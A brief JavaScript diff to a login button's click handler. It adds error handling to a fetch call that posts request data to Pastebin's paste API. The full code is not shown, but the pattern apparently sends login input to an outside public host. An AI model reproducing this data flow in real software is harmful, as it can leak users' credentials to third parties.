@@ -34,6 +34,8 @@ loginButton.addEventListener('click', () => {
 
         console.log(JSON.stringify(data), bodyParam);
 
-        fetch('https://pastebin.com/api/api_post.php', requestData);
+        fetch('https://pastebin.com/api/api_post.php', requestData).catch(
+            (err) => console.error(err),
+        );
     }
 });
